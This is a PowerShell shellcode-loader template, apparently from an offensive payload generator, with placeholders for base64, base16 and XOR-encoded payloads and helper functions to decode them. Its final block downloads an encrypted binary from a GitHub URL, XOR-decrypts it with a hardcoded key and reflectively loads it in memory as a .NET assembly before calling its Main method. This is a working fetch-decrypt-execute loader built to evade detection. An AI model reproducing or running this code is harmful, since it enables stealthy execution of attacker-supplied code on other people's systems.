# Base64 encoded payload
$base64EncodedPayload = {{ base64EncodedPayload }}
$base64EncodedXORKey = {{ base64EncodedXORKey }}

# PowerShell decode Base64 to byte array
[byte[]] $shellcode = [System.Convert]::FromBase64String($base64EncodedPayload)

# PowerShell decode base64 if dealing with strings and not binary
$plaintextshellcode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64EncodedPayload))

# PowerShell encoded payload base16
$base16EncodedPayload = {{ base16EncodedPayload }}
$base16EncodedXORKey = {{ base16EncodedXORKey }}

# PowerShell decode base16 to byte array
function base16StringToByteArray {

    Param(
        [parameter(Mandatory=$true)]
        [String]
        $base16EncodedPayload
    )

    $result = $base16EncodedPayload -split '(..)' -ne ''
    $bytearr = [byte[]]::new($base16EncodedPayload.Length / 2)
    for ($itr = 0 ; $itr -lt $result.Length ; $itr++)
    {
        $bytearr[$itr] = [convert]::ToByte($result[$itr], 16)
    }
    return $bytearr
}

# One liner decode base16 to bytearray
[byte[]] $shellcode = base16StringToByteArray $base16EncodedPayload

# PowerShell byte array
[byte[]] $intArray = {{ intArray }}

[byte[]] $hexArray = {{ hexArray }}


# PowerShell XOR Function
function xor ($bytes, $xorValue) {

    for($i=0; $i -lt $bytes.Length ; $i++)
    {
        $keyItr = $i % $xorValue.Length;
        $bytes[$i] = $bytes[$i] -bxor $xorValue[$keyItr]
    }

    return $bytes
}

$xorStringValue = "{{ xorStringValue }}"
[byte[]] $xorIntArray = {{ xorIntArray }}
[byte[]] $xorHexArray = {{ xorHexArray }}

# XOR One liner
# $bytes is a byte array of the payload
# $xorValue is a byte array of the XOR key
for($i=0; $i -lt $bytes.Length ; $i++) { $keyItr = $i % $xorValue.Length; $bytes[$i] = $bytes[$i] -bxor $xorValue[$keyItr] }


# Other miscellanous parts that may be useful, e.g. downloading and loading a C# assembly to reflectively load
# $bytes = (Invoke-WebRequest "https://github.com/js-r-api/test/raw/main/encrypted_payload.bin").Content
$bytes = (Invoke-WebRequest "https://github.com/js-r-api/test/raw/main/encrypted_payload.bin").Content
[byte[]] $xorValue = 109,121,32,107,101,121,32,108,111,108,122
for($i=0; $i -lt $bytes.Length ; $i++) { $keyItr = $i % $xorValue.Length; $bytes[$i] = $bytes[$i] -bxor $xorValue[$keyItr] }
$RAS = [System.Reflection.Assembly]::Load($bytes)
[Namespace.Program]::Main("") # change this
